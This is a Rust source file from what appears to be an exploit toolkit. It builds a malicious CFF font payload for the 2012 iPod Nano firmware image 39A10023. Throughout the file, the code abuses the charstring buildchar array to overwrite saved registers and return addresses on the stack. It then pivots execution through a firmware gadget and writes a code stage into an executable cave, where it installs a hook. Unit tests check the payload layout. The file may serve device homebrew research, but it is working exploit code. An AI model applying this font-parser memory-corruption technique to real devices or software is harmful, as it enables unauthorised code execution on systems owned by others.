use crate::payload::exploit_config::ExploitConfig;
use crate::payload::{CffPayloadBuilder, Payload};
use anyhow::{ensure, Result};

/// Executable padding in the 39A10023 OS image, verified byte-for-byte against
/// the live 2012 Nano before this payload was introduced.
pub const DEFERRED_CAVE_ADDRESS: u32 = 0x086c_97e4;
pub const DEFERRED_CAVE_CAPACITY: usize = 0x7f4;
pub const DEFERRED_STAGE_SIZE: usize = 0x600;
pub const DEFERRED_PUBLISHER_SIZE: usize = 0x1f4;
const PUBLISHER_REPORTER_OFFSET: usize = 0x168;
const REPORTER_SIZE: usize = 140;

/// Header plus partitioned ACTION/completion records. The CFF writer skips only
/// this range on first and repeat decodes: stock cave bytes supply initial
/// zeroes, and the exact-owner publisher performs the only initialization.
/// The adjacent matcher is immutable code and is deliberately republished with
/// identical bytes by the same full-image cache operation as the primary stage.
const RECORDER_STATE_OFFSET: usize = 0x3a0;
const RECORDER_STATE_SIZE: usize = 0x200;
const ACTION_MATCHER_OFFSET: usize = 0x5a0;
const ACTION_MATCHER_SIZE: usize = 0x60;

const INSTALL_DESCRIPTOR_SENTINEL: u32 = 0x4353_4544;
// Per-invocation scratch in cff_slot_load's original buildchar array.  The
// cave publisher recovers these words from the retired caller frame, avoiding
// shared mutable return state when font decodes overlap.
const INSTALL_SCRATCH_WORDS: [u16; 4] = [0, 1, 2, 3];
const INSTALL_LOCK_WORD: usize = 24;
const INSTALL_DESCRIPTOR_WORD: usize = 28;
const INSTALL_DESCRIPTOR_SIZE_OFFSET: usize = 0x2c;
const INSTALL_DESCRIPTOR_RESERVED_OFFSET: usize = 0x30;
const INSTALL_DESCRIPTOR_CAVE_OFFSET: usize = 0x34;
const INSTALL_DESCRIPTOR_SIZE: usize = 0x38;

// 39A10023 firmware sequences. cff_slot_load first returns to the existing
// mov r0,r4; blx r5 pair. r5 enters the cache wrapper after its prologue:
//   ldr r1,[r0,#0x2c]; ldr r0,[r0,#0x34]; mov.w r12,#7; svc #70;
//   pop {r4,pc}
const INSTALL_CACHE_CALL: u32 = 0x0800_5203;
const INSTALL_CACHE_WRAPPER: u32 = 0x0841_17df;
const SAVED_R4_WORD: u16 = 143;
const SAVED_R5_WORD: u16 = 144;
const SAVED_PC_WORD: u16 = 151;
const GADGET_STACK_WORD: u16 = 152;
const GADGET_PC_WORD: u16 = 153;

/// Boot-safe CFF payload for the fixed deferred NanoApps stage.
///
/// The decoder writes the complete stage and its small publisher directly to
/// the verified OS cave before processing the real endchar. The later
/// cff_slot_load path may release the source charstring frame, but this payload
/// retains no pointer into it. The stock cache wrapper publishes the cave and
/// enters the cave-resident publisher, which installs the action hook and
/// resumes the captured firmware continuation.
pub struct BootstrapPayload {
    cave_image: Vec<u8>,
    publisher_offset: usize,
    install_lock_word: u16,
    descriptor_word: u16,
}

impl BootstrapPayload {
    pub fn new(stage: Vec<u8>, publisher: Vec<u8>) -> Result<Self> {
        ensure!(
            !stage.is_empty() && stage.len() % 4 == 0,
            "deferred stage must be nonempty and word aligned"
        );
        ensure!(
            stage.len() == DEFERRED_STAGE_SIZE,
            "deferred publisher is bound to a {DEFERRED_STAGE_SIZE}-byte stage, got {} bytes",
            stage.len()
        );
        ensure!(
            RECORDER_STATE_OFFSET + RECORDER_STATE_SIZE <= stage.len()
                && stage[RECORDER_STATE_OFFSET..RECORDER_STATE_OFFSET + RECORDER_STATE_SIZE]
                    .iter()
                    .all(|byte| *byte == 0),
            "recorder mutable state must be zero in the stage artifact"
        );
        ensure!(
            RECORDER_STATE_OFFSET + RECORDER_STATE_SIZE == ACTION_MATCHER_OFFSET
                && ACTION_MATCHER_OFFSET + ACTION_MATCHER_SIZE == stage.len()
                && stage[ACTION_MATCHER_OFFSET..ACTION_MATCHER_OFFSET + ACTION_MATCHER_SIZE]
                    .iter()
                    .any(|byte| *byte != 0),
            "action matcher must occupy the exact published post-report gap"
        );
        ensure!(
            !publisher.is_empty() && publisher.len() % 4 == 0,
            "CFF cave publisher must be nonempty and word aligned"
        );
        ensure!(
            stage.len() + publisher.len() <= DEFERRED_CAVE_CAPACITY,
            "direct cave image is {} bytes; verified cave capacity is {} bytes",
            stage.len() + publisher.len(),
            DEFERRED_CAVE_CAPACITY
        );
        ensure!(
            publisher.len() == DEFERRED_PUBLISHER_SIZE,
            "CFF cave publisher must be the exact {DEFERRED_PUBLISHER_SIZE}-byte v2 artifact"
        );
        ensure!(
            PUBLISHER_REPORTER_OFFSET + REPORTER_SIZE == publisher.len(),
            "startup reporter must occupy the final 140 publisher bytes"
        );

        let locate = |sentinel: u32, name: &str| -> Result<usize> {
            let needle = sentinel.to_le_bytes();
            let hits: Vec<_> = publisher
                .chunks_exact(4)
                .enumerate()
                .filter_map(|(index, word)| (word == needle).then_some(index))
                .collect();
            ensure!(
                hits.len() == 1,
                "CFF cave publisher {name} sentinel is missing or ambiguous"
            );
            Ok(hits[0])
        };

        let descriptor_in_publisher = locate(INSTALL_DESCRIPTOR_SENTINEL, "cache descriptor")?;
        ensure!(
            descriptor_in_publisher == INSTALL_DESCRIPTOR_WORD,
            "CFF cave publisher descriptor moved from offset 0x70"
        );

        let read_publisher_word = |offset: usize| -> u32 {
            u32::from_le_bytes(publisher[offset..offset + 4].try_into().unwrap())
        };
        ensure!(
            read_publisher_word(INSTALL_LOCK_WORD * 4) == 0,
            "CFF cave publisher atomic install lock template must be zero"
        );
        let descriptor_offset = descriptor_in_publisher * 4;
        ensure!(
            read_publisher_word(descriptor_offset + INSTALL_DESCRIPTOR_SIZE_OFFSET)
                == (stage.len() + publisher.len()) as u32,
            "CFF cave publisher cache size does not cover the direct cave image"
        );
        ensure!(
            read_publisher_word(descriptor_offset + INSTALL_DESCRIPTOR_RESERVED_OFFSET) == 0,
            "CFF cave publisher descriptor reserved word must be zero"
        );
        ensure!(
            read_publisher_word(descriptor_offset + INSTALL_DESCRIPTOR_CAVE_OFFSET)
                == DEFERRED_CAVE_ADDRESS,
            "CFF cave publisher descriptor is not bound to the verified cave"
        );

        let publisher_offset = stage.len();
        let install_lock_word = (stage.len() / 4 + INSTALL_LOCK_WORD) as u16;
        let descriptor_word = (stage.len() / 4 + descriptor_in_publisher) as u16;
        let mut cave_image = stage;
        cave_image.extend_from_slice(&publisher);
        Ok(Self {
            cave_image,
            publisher_offset,
            install_lock_word,
            descriptor_word,
        })
    }
}

impl Payload for BootstrapPayload {
    fn build_cff<Cfg: ExploitConfig>(&self, b: &mut CffPayloadBuilder) {
        b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);

        // Preserve everything needed after the stock wrapper before pivoting
        // buildchar away from the decoder stack.
        b.index_read(GADGET_STACK_WORD);
        b.index_read(GADGET_PC_WORD);
        b.index_read(SAVED_R5_WORD);
        b.index_read(SAVED_PC_WORD);

        // Consume the captures into this invocation's own original buildchar
        // storage at frame SP+0x148.  The full post-decoder path no longer
        // references that array, and the publisher reaches it at SP-0x268
        // immediately after the cache wrapper.  Reverse consumption preserves
        // A/B/r5/continuation in words 0/1/2/3 respectively.
        for scratch_word in INSTALL_SCRATCH_WORDS.into_iter().rev() {
            b.index_write_saved(scratch_word);
        }

        // The wrapper pop restores the caller's original r4 and enters the
        // cave publisher. The publisher repairs both overwritten stack words.
        b.index_read(SAVED_R4_WORD);
        b.index_write_saved(GADGET_STACK_WORD);
        b.index_write(
            GADGET_PC_WORD,
            (DEFERRED_CAVE_ADDRESS + self.publisher_offset as u32) | 1,
        );
        b.index_write(
            SAVED_R4_WORD,
            DEFERRED_CAVE_ADDRESS + u32::from(self.descriptor_word) * 4,
        );
        b.index_write(SAVED_R5_WORD, INSTALL_CACHE_WRAPPER);
        b.index_write(SAVED_PC_WORD, INSTALL_CACHE_CALL);

        // Every later put is cave-relative. Skip every mutable recorder word
        // and the publisher's atomic claim word. There is deliberately no
        // legacy stage busy-word skip: offset 0x2f4 is executable v2 data.
        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, DEFERRED_CAVE_ADDRESS);
        let recorder_first_word = RECORDER_STATE_OFFSET / 4;
        let recorder_end_word = (RECORDER_STATE_OFFSET + RECORDER_STATE_SIZE) / 4;
        for (index, chunk) in self.cave_image.chunks_exact(4).enumerate() {
            if (recorder_first_word..recorder_end_word).contains(&index)
                || index == usize::from(self.install_lock_word)
            {
                continue;
            }
            b.index_write_array(index as u16, chunk.try_into().unwrap());
        }

        // The pointer-swap prelude deliberately leaves old random operands on
        // the Type 1 stack. Empty it before the real endchar; otherwise the
        // firmware treats the first four leftovers as a seac composite glyph.
        let residual_operands = Cfg::PUSH_COUNT + Cfg::SWAP_COUNT + 1 - Cfg::DROP_COUNT;
        for _ in 0..residual_operands {
            b.drop();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn publisher() -> Vec<u8> {
        let mut words = vec![0_u32; DEFERRED_PUBLISHER_SIZE / 4];
        words[0] = 0x1122_3344;
        words[28] = INSTALL_DESCRIPTOR_SENTINEL;
        words[39] = (DEFERRED_STAGE_SIZE + words.len() * 4) as u32;
        words[40] = 0;
        words[41] = DEFERRED_CAVE_ADDRESS;
        words.into_iter().flat_map(u32::to_le_bytes).collect()
    }

    fn stage() -> Vec<u8> {
        let mut stage = vec![0; DEFERRED_STAGE_SIZE];
        stage[ACTION_MATCHER_OFFSET] = 1;
        stage
    }

    #[test]
    fn accepts_exact_direct_cave_contract() {
        let payload = BootstrapPayload::new(stage(), publisher()).unwrap();
        assert_eq!(
            payload.cave_image.len(),
            DEFERRED_STAGE_SIZE + DEFERRED_PUBLISHER_SIZE
        );
        assert_eq!(payload.publisher_offset, DEFERRED_STAGE_SIZE);
        assert_eq!(payload.install_lock_word, 408);
        assert_eq!(payload.descriptor_word, 412);
        assert!(payload.trailing_data().is_empty());
    }

    #[test]
    fn rejects_artifacts_outside_verified_contract() {
        assert!(BootstrapPayload::new(vec![0; 16], publisher()).is_err());

        let mut nonzero_state = stage();
        nonzero_state[RECORDER_STATE_OFFSET] = 1;
        assert!(BootstrapPayload::new(nonzero_state, publisher()).is_err());

        let no_matcher = vec![0; DEFERRED_STAGE_SIZE];
        assert!(BootstrapPayload::new(no_matcher, publisher()).is_err());

        let mut wrong_size = publisher();
        wrong_size[39 * 4] ^= 1;
        assert!(BootstrapPayload::new(stage(), wrong_size).is_err());

        let mut ambiguous = publisher();
        ambiguous[27 * 4..28 * 4].copy_from_slice(&INSTALL_DESCRIPTOR_SENTINEL.to_le_bytes());
        assert!(BootstrapPayload::new(stage(), ambiguous).is_err());
    }
}
